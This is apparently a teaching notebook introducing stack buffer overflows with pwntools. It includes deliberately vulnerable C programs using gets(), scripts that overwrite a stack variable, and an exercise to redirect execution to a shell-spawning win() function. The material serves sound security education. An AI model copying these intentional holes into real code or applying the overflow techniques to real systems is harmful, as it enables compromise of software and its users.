<h1 style="font-size:50px; font-family:Monaco; text-align:center">IntroSec - PWN, or Binary Exploitation</h1>
<h1 style="font-size:30px; font-family:Monaco; text-align:center">Part 1: Memory Corrupton</h1>

<hr style="border:1px solid white">

<h1 style="font-size:30px; font-family:Monaco">1 - What <em>is</em> memory?</h1>

There are two main layouts of memory in a program, the <strong>Stack</strong> and the <strong>Heap</strong>. We will mostly be focusing on the stack as heap exploitation is quite advanced and is best explored once you are comfortable with stack exploitation.

<hr style="border:1px solid white">

<h2 style="font-size:20px; font-family:Monaco">1.1 - Execution of a program</h2>

You should know this from RE, but as a refresher:
* <strong>Stack Frames</strong> store local data for functions (when called)
* Every time a function is called, a new frame is created for it
* Arguments (on x64) are passed in the order `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`
  * Further arguments are passed onto the stack
* `RIP` contains the address of the current instruction to be executed
* `RAX` contains the return value of a function (after the return, can otherwise be used as general purpose)
* `leave` is an alias for:
```c
        mov rsp, rbp
        pop rbp
```
* `ret` is an alias for:
```c
        pop rip
```
* Registers' prefixes denote their size
  * "R" uses all 64 bits (e.g. `RSP`)
  * "E" uses the low 32 bits (e.g. `EIP`)
  * Just the last two characters uses the low 16 bits (e.g. `AX`)
    *  This can be further specified to the lowest 8 bits (`AL`) or the highest 8 bits of the lowest 16 bits (that is, the highest 8 bits of `AX`, e.g. `AH`)

*Example execution of a 32-bit program starting at `0x80483ed`:*<br>
<img src="./media/execution_example.gif">

As we can see in the above animation, as each instruction is executed, `EIP` updates to move to the address of the next instruction. Note that this example is 32-bit, and as such, all the registers begin with "E."

<hr style="border:1px solid white">

<h2 style="font-size:20px; font-family:Monaco">1.2 - What's our goal?</h2>

The typical goal of any CTF challenge (or vulnerability researcher working on a actual target) is to obtain a shell by controlling where `RIP` is, and more precisely, what `RIP` is. The simplest way that this can occur is via a `Buffer Overflow.` This typically occurs when some program retrieves an amount of input greater than the area that it is stored into (e.g. a program receives 16 bytes of data and places it into a region of memory meant for 8 bytes). This results in the excess of bytes overflowing into other parts of memory.

<hr style="border:1px solid white">

<h2 style="font-size:20px; font-family:Monaco">1.3 - Tool(s) of the trade</h2>

Many of the tools from reverse engineering will be used in binary exploitation, most especially debuggers. These are extremely useful in examining how your input affects the program, the path the program takes during execution, and how your input is processed by the program (and by extension, what you have to input to achieve a desired state of memory).

Static analysis tools are still useful but you will likely be a little less reliant on them. Many CTF challenges provide an executable program as well as the source code to prevent the tedium of reverse engineering, though some will only give you the binary and you will have to combine both skillsets to win.

The main tool we will be introducing for binary exploitation is a `Python` library called `pwntools`. This is a library meant for exploit development and facilitates a wide variety of operations within the realm of binary exploitation. Here's a skeleton script:

```c
from pwn import *

# "You wouldn't normally have all three of these, they are just here to demonstrate the difference between remote, local, and debugging interactions with your script"
p = remote("chall.ctf.com", 12345)
p = process("./chal")
p = gdb.debug("./chal")

p.readuntil(b':')
p.sendline(b'Hello!')
p.readuntil(b':')
p.sendline(b'\x01\x02\x03\x04' + b'\x41' * 16 + b'\x08\x24\x40')

address = 0x7ffff3e692d1
p.sendline(p64(address))

leak = p.readuntil(b'\n')[:-1]
unpacked = u64(leak)
    
p.interactive()
```

Let's go over the script and explain the basic functions you'll need:

1. `remote()` - Specifies a hostname (or IP address) as its first argument and a port number as its second and is mainly used for connecting to servers serving the challenge (as the flag typically isn't included locally for pwn challenges).
2. `process()` - Simply connects to a file on your program.
3. `gdb.debug()` - Opens a local file in a `gdb` debugging session. The return value of all of these are what you use to interact with the program, so make sure to assign it to a variable.<br><br>
NOTE: When reading from or sending to a process, you need to specify all data as bytestrings (i.e. surrounded by '' or "" and prefixed with b). If you want to send a byte as that byte (e.g. the byte `0x11` instead of the number (decimal) `17`), you need to specify in the bytestring as `b'\x11'`. Strings/characters are also valid but still require the b prefix (e.g. `b'Test'` or `b'\n'`)<br><br>
4. `p.readuntil()` - Reads from process "p" until a given byte or bytestring (including that byte or bytestring). Some people prefer `p.sendlineafter()` which will send a line after a certain input or will choose to omit reading statements entirely. While not necessary, these improve readability and combined with good comments can help you follow along with your own exploit.
5. `p.sendline()` - Sends your input (must be a bytestring OR encodable) followed by a newline character (think about hitting the enter key after typing a message).
6. `p64()` - This will convert a number to a "packed" representation such that the result is a bytestring (little endian) representing that value. This is useful if you don't want to deal with manually writing in every single byte in a bytestring with the correct endianness, and at times may be required as the value you need to send as a bytestring may not be the same across every single run (i.e. it cannot be hardcoded).
7. `u64()` - This will convert a "packed" representation of a number (i.e. a bytestring representing that number) to an integer that you can work with in `Python`. This may not seem useful now, but we will get to a point where we will need to read in bytes from a program and `u64()` is precisely the tool to do it.
8. `p.interactive()` - This restores control of the program to the user. This is typically used at the end of an exploit such that you can interact with the shell you have obtained.

Don't worry about memorizing all of these right now. The more you use them the more they will stick with you.

With our preamble review and tool introduction out of the way, let's look at our first example:

<hr style="border:1px solid white">

<h1 style="font-size:30px; font-family:Monaco">Example 1: Overwrite</h1>

In [7]:
!mkdir -p /home/user/introsec/pwn/memcorrup/binaries

In [8]:
%cd /home/user/introsec/pwn/memcorrup/binaries

/home/user/introsec/pwn/memcorrup/binaries


In [9]:
%%file overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//gcc overwrite.c -o overwrite -fno-stack-protector -no-pie

int main(void){
  char buffer[16];
  memset(buffer, 0, sizeof(buffer));
  unsigned long target = 0xdeadbeefc001babe;

  printf("Compiling this program warns about gets(), but it's fine. Probably. Right?\n");
  printf("Here, send me some input so we can prove that nothing bad will happen: ");
  fflush(stdout);
  gets(buffer);

  if (target == 0xdeadbeefc001babe)
    printf("See! Nothing has changed, target is 0x%lx\n", target);
  else
    printf("Huh... that's odd, target is 0x%lx\n", target);

  return 0;
}

Overwriting overwrite.c


This is the most basic of basic challenge formats, a completely wild stack smash that requires no precision. Let's see what is actually happening in memory when this program receives our input.

In [10]:
!gcc overwrite.c -o overwrite -fno-stack-protector -no-pie

overwrite.c: In function ‘main’:
overwrite.c:15:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? []8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wimplicit-function-declaration-Wimplicit-function-declaration]8;;]
   15 |   gets(buffer);
      |   ^~~~
      |   fgets
/usr/bin/ld: /tmp/ccZ6nYYg.o: in function `main':
overwrite.c:(.text+0x6f): warning: the `gets' function is dangerous and should not be used.


Take note of the warning here, `GCC` recognizes that `gets()` is dangerous.

Here's a simple `pwntools` script to send in "Hello!" to the program:

In [11]:
%%file hello.py
from pwn import * # Import pwntools

p = process("./overwrite") # We want to interact with the overwrite binary we just created

print(p.readuntil(b'\n')[:-1])
print(p.readuntil(b':')) # You can totally just use this line instead of reading until \n and then :, but to display both I read separately
p.sendline(b'Hello!') # Send our input
print(p.readuntil(b'\n')[:-1]) # Display our output

# Note that I omitted p.interactive() here just because we don't need to keep interacting with it
# Also Jupyter doesn't like it :P

Overwriting hello.py


In [12]:
!python3 hello.py

[x] Starting local process './overwrite'
[┤] 
Starting local process './overwrite': pid 23278
[+] 
b"Compiling this program warns about gets(), but it's fine. Probably. Right?"
b'Here, send me some input so we can prove that nothing bad will happen:'
b' See! Nothing has changed, target is 0xdeadbeefc001babe'
[*] Process './overwrite' stopped with exit code 0 (pid 23278)


Here's a visual of the stack before and after our "Hello!" input:

<em>Before:</em><br>
<img src="./media/before_input.png">

<em>After:</em><br>
<img src="./media/after_input.png">

As we can see, our input has gone into buffer, taking up the first few bytes of space. Each hexadecimal number per box (i.e. each byte) corresponds to an ASCII character, e.g. 0x48 = "H", 0x65 = "e", 0x6c = "l", etc. Note that this is read right-to-left as memory is stored in little endian (on this particular system).

So, what makes `gets()` dangerous enough that even the compiler will warn you against using it? Simple: it doesn't bound the length of your input. If we were to send in 16 "a" characters, our resulting buffer would be filled with `0x61` (the hexadecimal ASCII representation of the character "a"). This is pictured below:

<img src="./media/buncha_as.png">

Something important to note here is that extra `0x00` in the padding section of the stack now. Many functions that receive input from the user will often append (or in safer cases, set the last byte to) `0x00` such that other functions know where this data ends.


By sending 16 bytes to fill up the buffer, `gets()` appended an extra `0x00` which bled into padding. A safer function such as `fgets()` with a specified size of 16 bytes would've received the first 15 "a"s and then set the 16th byte (the furthest left byte in the second row of buffer's allotted memory) to 0, preventing the <strong>buffer overflow</strong>.

We now see that a function that receives more bytes than the specified storage location can hold will overflow into other parts of memory. Let's try sending in 24 "a"s. The result is shown below:

<img src="./media/first_overwrite.png">

As we can see, the lowest byte of target is set to `0x00` as the extra 25th byte <strong>overwrites</strong> the least significant byte of `target`.

Let's verify this experimentally with a modified version of our previous script:

In [13]:
%%file one_byte_overwrite.py
from pwn import * # Import pwntools

p = process("./overwrite") # We want to interact with the overwrite binary we just created

print(p.readuntil(b'\n')[:-1])
print(p.readuntil(b':')) # You can totally just use this line instead of reading until \n and then :, but to display both I read separately
p.sendline(b'a' * 24) # Send our input - As a tip, you can "multiply" bytestrings to send a certain number of them
print(p.readuntil(b'\n')[:-1]) # Display our output

Overwriting one_byte_overwrite.py


In [14]:
!python3 one_byte_overwrite.py

[x] Starting local process './overwrite'
[.] 
Starting local process './overwrite': pid 23591
[+] 
b"Compiling this program warns about gets(), but it's fine. Probably. Right?"
b'Here, send me some input so we can prove that nothing bad will happen:'
[*] Process './overwrite' stopped with exit code 0 (pid 23591)
b" Huh... that's odd, target is 0xdeadbeefc001ba00"


As we can see, the LSB of `target` is now `0x00`. What if we send one more "a" for a total of 25?

In [15]:
%%file two_byte_overwrite.py
from pwn import * # Import pwntools

p = process("./overwrite") # We want to interact with the overwrite binary we just created

print(p.readuntil(b'\n')[:-1])
print(p.readuntil(b':')) # You can totally just use this line instead of reading until \n and then :, but to display both I read separately
p.sendline(b'a' * 25) # Send our input - As a tip, you can "multiply" bytestrings to send a certain number of them
print(p.readuntil(b'\n')[:-1]) # Display our output

Overwriting two_byte_overwrite.py


In [16]:
!python3 two_byte_overwrite.py

[x] Starting local process './overwrite'
[←] 
Starting local process './overwrite': pid 23620
[+] 
b"Compiling this program warns about gets(), but it's fine. Probably. Right?"
b'Here, send me some input so we can prove that nothing bad will happen:'
b" Huh... that's odd, target is 0xdeadbeefc0010061"
[*] Process './overwrite' stopped with exit code 0 (pid 23620)


Now, we have set the least significant byte to our input (`0x61`, the ASCII representation of "a") and the second least significant byte is the appended `0x00`. We can keep going as far as we want to overwrite all of `target` (and past it!) with whatever we want. We'll see why this is useful later.

Feel free to mess around with the inputs in the previous two scripts to get a better understanding of how memory is interpreted (e.g. try sending in some bytes like `b'\x24\x56\x85'` and see how they are interpreted in-memory.

Now it's time for some practice!

<hr style="border:1px solid white">

<h1 style="font-size:30px; font-family:Monaco">Practice: 1337 Overwrite</h1>

Using the basic understanding of a buffer overflow, trigger the alternative print statement by overwriting `target` and setting it to a specific value. 

NOTE: The size of `buffer` and `target` are different so you'll have to determine the right number of bytes to offset before the correct input! Use `GDB` by itself or you can try out the `gdb.debug()` function from `pwntools` (if you use `pwntools` make sure you run it in a `Python` script <strong>outside</strong> of the notebook since it won't function properly otherwise).

In [11]:
%%file leetoverwrite.c
#include <stdio.h>
#include <stdlib.h>

//gcc leetoverwrite.c -o leetoverwrite -fno-stack-protector -no-pie

int main(void){
  char buffer[24];
  int target = 0xcafe;

  printf("Overwrite target and set it to 0x1337!\n");
  printf("Input here: ");
  fflush(stdout);
  gets(buffer);

  if (target == 0x1337)
    printf("Awesome job, you got it!\n");
  else
    printf("Not quite right, try again.\n");

  return 0;
}

Overwriting leetoverwrite.c


In [12]:
!gcc leetoverwrite.c -o leetoverwrite -fno-stack-protector -no-pie

leetoverwrite.c: In function ‘main’:
leetoverwrite.c:13:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? []8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wimplicit-function-declaration-Wimplicit-function-declaration]8;;]
   13 |   gets(buffer);
      |   ^~~~
      |   fgets
/usr/bin/ld: /tmp/ccvVcJv4.o: in function `main':
leetoverwrite.c:(.text+0x52): warning: the `gets' function is dangerous and should not be used.


In [32]:
%%file leetsolve.py
from pwn import * # Import pwntools

p = process("./leetoverwrite") # We want to interact with the overwrite binary we just created
p.readuntil(b':')

p.sendline(b'Edit me!') # EDIT THIS ONE!

print(p.readuntil(b'\n').decode()) # Keep this as your last statement! It'll print out whether or not you got it right

Overwriting leetsolve.py


Use the below cell to run your code.

In [33]:
!python3 leetsolve.py

[x] Starting local process './leetoverwrite'
[▖] 
Starting local process './leetoverwrite': pid 9900
[+] 
 Not quite right, try again.

[*] Process './leetoverwrite' stopped with exit code 0 (pid 9900)


<hr style="border:1px solid white">

<h1 style="font-size:30px; font-family:Monaco">2 - How can we exploit this?</h1>

Thus far, we've gained a basic understanding of overflowing data on the stack to modify data in memory. The danger here isn't immediately clear as it appears as though we need to rely on programmers to write sensitive variables on the stack that we can affect via buffer overflows. However, there is a much more appealing target not too much further down.

<hr style="border:1px solid white">

<h2 style="font-size:20px; font-family:Monaco">2.1 - Stack frame cleanup</h2>

When a stack frame exits on an `x64` system, there are two instructions that are almost always executed. First, `leave`, then, `ret`. As shown at the top of the notebook, 
`leave` is an alias for:
```c
        mov rsp, rbp
        pop rbp
```
`ret` is an alias for:
```c
        pop rip
```

What this means is that, at the end of every function, the stack will be moved to whatever is stored in `RBP` and the top two values will be popped off and into `RBP` and `RIP` respectively. As we discussed initially, controlling `RIP` is (usually) the goal and now we have a way to do it. Let's revisit the image of the stack from before:

<img src="./media/before_input.png">

Assuming that the stack frame is unaltered during execution, `leave` will move `RBP` into `RSP`, causing the stack to point to the blue row and pop it off into `RBP`. This follows logic as we need to update the base pointer to point to the base of the previous frame. After the blue row is popped off, `RSP` will now be pointing to the red row. `ret` will execute, popping the red row into `RIP`.

Since there is no limit on how far we can overwrite with `gets()`, we can overwrite the red row and get control of `RIP`.

<hr style="border:1px solid white">

<h2 style="font-size:20px; font-family:Monaco">2.2 - Goal?</h2>

Still, we haven't discussed what we want to do with `RIP` in order to "win." As a general rule, we want a shell on the system, typically obtained via `system("/bin/sh")` or `execve("/bin/sh", 0, 0)`. We'll get to more advanced techniques for setting up and executing these calls, but for now, we will work with a "win" function, e.g.

```c
void win(){
  system("/bin/sh");
}
```

While functions like these should never be found in actual targets, plenty exist in pwn challenges. They typically serve as your goal with your objective being to return to this function in some way.

<hr style="border:1px solid white">

<h1 style="font-size:30px; font-family:Monaco">Putting it all together: Heist the Museum</h1>

Using everything you have learned about memory corruption, buffer overflows, and stack overwrites to return to the win function!

In [15]:
%%file museumheist.c
#include <stdio.h>
#include <stdlib.h>

//gcc museumheist.c -o museumheist -fno-stack-protector -no-pie

void win(){
  system("/bin/sh");
}

int main(void){
  char name[32];
  int money = 100;

  printf("Welcome to our museum! To join our frequent visitors program, please enter your name: ");
  fflush(stdout);
  gets(name);

  printf("Welcome, %s. You have currently visited %d times.\n", name, money);

  return 0;
}

Writing museumheist.c


In [16]:
!gcc museumheist.c -o museumheist -fno-stack-protector -no-pie

museumheist.c: In function ‘main’:
museumheist.c:16:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? []8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wimplicit-function-declaration-Wimplicit-function-declaration]8;;]
   16 |   gets(name);
      |   ^~~~
      |   fgets
/usr/bin/ld: /tmp/cczXnUuZ.o: in function `main':
museumheist.c:(.text+0x5d): warning: the `gets' function is dangerous and should not be used.


In [17]:
%%file heistsolve.py
from pwn import *

p = process("./museumheist")

# Your code here!

Writing heistsolve.py


From your time in RE, you should be able to identify the address of a function relatively easily. Use the concepts of the practice challenge to overwrite the return address of `main()` with a specific value and call `win()` for a shell.

Note that you'll need to do this outside of the notebook as obtaining the shell won't work properly inside of it. Feel free to reference your previous code and the example at the top of the notebook while writing your script!